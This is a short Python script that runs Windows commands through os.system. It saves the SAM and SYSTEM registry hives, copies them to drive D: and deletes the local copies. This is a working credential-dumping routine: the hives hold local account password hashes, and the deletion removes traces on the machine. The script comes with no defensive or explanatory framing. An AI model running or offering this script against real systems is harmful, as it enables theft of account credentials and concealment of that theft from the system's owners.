import os
cmd = [
        'reg save HKLM\sam ./sam.save',
        'reg save HKLM\system ./sys.save',
        'copy sam.save D:',
        'copy sys.save D:',
        'del sam.save',
        'del sys.save'
        ]
for i in cmd:
    os.system(i)
